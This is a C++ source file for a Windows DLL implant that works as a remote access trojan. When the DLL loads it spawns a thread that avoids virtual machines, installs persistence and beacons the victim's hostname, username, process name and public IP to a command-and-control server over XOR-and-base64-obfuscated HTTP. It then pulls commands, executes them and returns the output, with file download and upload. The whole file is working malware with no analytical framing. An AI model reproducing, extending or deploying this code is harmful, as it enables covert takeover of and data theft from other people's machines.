#include <windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <sstream>
#include <vector>
#include "config.h"
#include "system_utils.h"
#include "base64.h"
#include "crypt.h"
#include "http_client.h"
#include "task.h"
#include "persistence.h"
#ifdef ANTI_VM_ENABLED
extern "C" bool is_virtual_machine();
#endif

using namespace std;

void parse_command_type(const string& command, string& types, string& value) {
    size_t sep1 = command.find('\'');
    if (sep1 == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    size_t sep2 = command.find('\'', sep1 + 1);
    if (sep2 == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    types = command.substr(sep1 + 1, sep2 - sep1 - 1);

    size_t colon = command.find(':', sep2);
    if (colon == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    size_t sep3 = command.find('\'', colon);
    if (sep3 == string::npos) {
        types = "cmd";
        value = command;
        return;
    }

    size_t sep4 = command.find('\'', sep3 + 1);
    if (sep4 == string::npos) {
        value = command.substr(sep3 + 1);
        size_t end = value.find_last_not_of(" \t\r\n'");
        if (end != string::npos) {
            value = value.substr(0, end + 1);
        }
    } else {
        value = command.substr(sep3 + 1, sep4 - sep3 - 1);
    }
}

string extract_filename(const string& command_type, const string& command_value) {
    if (command_type != "download") {
        return "";
    }
    return command_value;
}


string send_beacon(const string& agent_id, const string& results_data = "") {
    string hostname = get_hostname();
    string username = get_username();
    string process_name = get_process_name();
    string ip_pub = getPublicIP();

    ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"hostname\":\"" << hostname << "\",";
    ss << "\"username\":\"" << username << "\",";
    ss << "\"process_name\":\"" << process_name << "\",";
    ss << "\"ip_address\":\"" << ip_pub << "\",";
    ss << "\"results\":\"" << results_data << "\"";
    ss << "}";

    string beacon_json = ss.str();
    string xor_encrypted = xor_data(beacon_json, XOR_KEY);
    string b64_encoded = base64_encode(xor_encrypted);

    string response = http_post(
        XOR_SERVERS,
        XOR_PORT,
        RESULTS_PATH,
        USER_AGENT,
        HEADER,
        b64_encoded
    );

    return response;
}

vector<pair<int64_t, string>> fetch_commands(const string& agent_id) {
    vector<pair<int64_t, string>> commands;

    ostringstream ss;
    ss << "{\"agent_id\":\"" << agent_id << "\"}";
    string request_json = ss.str();

    string xor_encrypted = xor_data(request_json, XOR_KEY);
    string b64_encoded = base64_encode(xor_encrypted);

    string response = http_post(
        XOR_SERVERS,
        XOR_PORT,
        "/api/command",
        USER_AGENT,
        HEADER,
        b64_encoded
    );

    if (response.empty()) {
        return commands;
    }

    string xor_response = base64_decode(response);
    string clear_response = xor_data(xor_response, XOR_KEY);

    // Parser le JSON pour extraire les commandes
    size_t commands_pos = clear_response.find("\"commands\":[");
    if (commands_pos == string::npos) {
        return commands;
    }

    size_t pos = commands_pos + 12;

    while (pos < clear_response.length()) {
        while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t' || clear_response[pos] == '\n')) pos++;

        if (pos >= clear_response.length() || clear_response[pos] == ']') break;

        if (clear_response[pos] == ',') {
            pos++;
            continue;
        }

        if (clear_response[pos] == '{') {
            pos++;

            int64_t cmd_id = -1;
            string cmd_text = "";

            while (pos < clear_response.length() && clear_response[pos] != '}') {
                while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t')) pos++;

                if (clear_response[pos] == ',') {
                    pos++;
                    continue;
                }

                if (clear_response.substr(pos, 5) == "\"id\":") {
                    pos += 5;
                    while (pos < clear_response.length() && (clear_response[pos] == ' ' || clear_response[pos] == '\t')) pos++;

                    size_t end = pos;
                    while (end < clear_response.length() && isdigit(clear_response[end])) end++;
                    cmd_id = atoll(clear_response.substr(pos, end - pos).c_str());
                    pos = end;
                }
                else if (clear_response.substr(pos, 11) == "\"command\":\"") {
                    pos += 11;
                    size_t end = pos;
                    while (end < clear_response.length()) {
                        if (clear_response[end] == '\\') {
                            end += 2;
                            continue;
                        }
                        if (clear_response[end] == '"') break;
                        end++;
                    }
                    cmd_text = clear_response.substr(pos, end - pos);
                    pos = end + 1;
                } else {
                    pos++;
                }
            }

            if (cmd_id != -1 && !cmd_text.empty()) {
                commands.push_back(make_pair(cmd_id, cmd_text));
            }

            pos++;
        } else {
            pos++;
        }
    }

    return commands;
}


bool submit_result(const string& agent_id, int64_t command_id, const string& output, bool success, const string& types, const string& filename = "") {
    string output_b64 = base64_encode(output);

    ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"command_id\":" << command_id << ",";
    ss << "\"output\":\"" << output_b64 << "\",";
    ss << "\"success\":" << (success ? "true" : "false") << ",";
    ss << "\"types\":\"" << types << "\"";

    if (!filename.empty()) {
        ss << ",\"filename\":\"" << filename << "\"";
    }

    ss << "}";
    string result_json = ss.str();

    string xor_encrypted = xor_data(result_json, XOR_KEY);
    string b64_encoded = base64_encode(xor_encrypted);

    string response = http_post(
        XOR_SERVERS,
        XOR_PORT,
        "/api/result",
        USER_AGENT,
        HEADER,
        b64_encoded
    );

    return !response.empty();
}

extern "C" __declspec(dllexport) void agent_run() {
    setvbuf(stdout, NULL, _IONBF, 0);

    #ifdef ANTI_VM_ENABLED
    if (is_virtual_machine()) {
        return;
    }
    #endif

    if (!is_persistence_installed()) {
        install_persistence();
    }

    string agent_id = generate_agent_id();

    string initial_response = send_beacon(agent_id, "");

    while (true) {
        this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));

        string beacon_response = send_beacon(agent_id, "");

        if (beacon_response.empty()) {
            continue;
        }

        vector<pair<int64_t, string>> commands = fetch_commands(agent_id);

        if (commands.empty()) {
            continue;
        }

        for (size_t i = 0; i < commands.size(); i++) {
            int64_t cmd_id = commands[i].first;
            string cmd_text = commands[i].second;

            string cmd_type, cmd_value;
            parse_command_type(cmd_text, cmd_type, cmd_value);

            string filename = extract_filename(cmd_type, cmd_value);

            string result = execute_command(cmd_text);
            bool success = !result.empty();

            string result_type;
            if (cmd_type == "download") {
                result_type = "file";
            } else if (cmd_type == "upload") {
                result_type = "upload_file";
            } else {
                result_type = "text";
            }

            submit_result(agent_id, cmd_id, result, success, result_type, filename);
        }
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)agent_run, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
